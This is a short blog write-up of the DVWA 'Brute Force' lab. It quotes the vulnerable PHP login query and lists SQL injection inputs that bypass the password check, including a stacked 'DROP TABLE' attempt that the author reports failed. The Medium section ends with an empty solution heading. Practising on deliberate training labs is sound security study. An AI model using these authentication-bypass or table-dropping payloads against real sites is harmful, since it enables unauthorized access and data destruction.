---
layout: post
title: "Brute Force"
date: 2020-07-03T22:26:03+08:00
---

<https://github.com/ethicalhack3r/DVWA/blob/master/vulnerabilities/brute/index.php>

## Low

### Code

```
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
```

No filter of user inputs, we can have two ways to bypass the password check.

### SQL Injection

<https://www.w3schools.com/sql/sql_injection.asp>

If we know the user name, we can fill in 

- user: `admin' or '' = '`.

```
    $query  = "SELECT * FROM `users` WHERE user = 'admin' or ''='' AND password = '$pass';";
```

If we do not know the user name, we can fill in 

- user: `x' or 1 = 1 limit 1 #`.
- user: `x' or 1 = 1 limit 1 -- `.

```
    $query  = "SELECT * FROM `users` WHERE user = 'xxx' or 1 = 1 limit 1 #' AND password = '$pass';";
```

We failed to do something like:

- user: `xxx' or ''='';  DROP TABLE Persons; #`

```
    $query  = "SELECT * FROM `users` WHERE user = 'xxx'; DROP TABLE Persons; #' AND password = '';";
```

<https://www.php.net/manual/en/mysqli.quickstart.multiple-statement.php>

> The API functions mysqli_query() and mysqli_real_query() do not set a connection flag necessary for activating multi queries in the server. An extra API call is used for multiple statements to reduce the likeliness of accidental SQL injection attacks. An attacker may try to add statements such as ; DROP DATABASE mysql or ; SELECT SLEEP(999). If the attacker succeeds in adding SQL to the statement string but mysqli_multi_query is not used, the server will not execute the second, injected and malicious SQL statement.

## Medium

### Code

```
    // Sanitise username input
    $user = $_GET[ 'username' ];
    $user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    
    // Check the database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
```

### Solution

